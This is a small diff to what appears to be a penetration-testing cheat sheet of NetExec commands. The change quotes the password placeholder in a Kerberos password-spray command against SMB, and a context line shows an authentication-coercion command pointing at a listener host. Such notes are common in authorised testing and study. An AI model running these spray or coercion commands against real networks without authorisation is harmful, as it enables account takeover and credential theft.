@@ -50,7 +50,7 @@ nxc smb <ip> -u '<user>' <auth> -M coerce_plus -o M=<method|pe> L=<lhost>
 
 ## password spray
 ```
-nxc smb <ip> -u <userlist|users.txt> -p <password> -k --continue-on-success
+nxc smb <ip> -u <userlist|users.txt> -p '<password>' -k --continue-on-success
 ```
 
 ## spray userlist
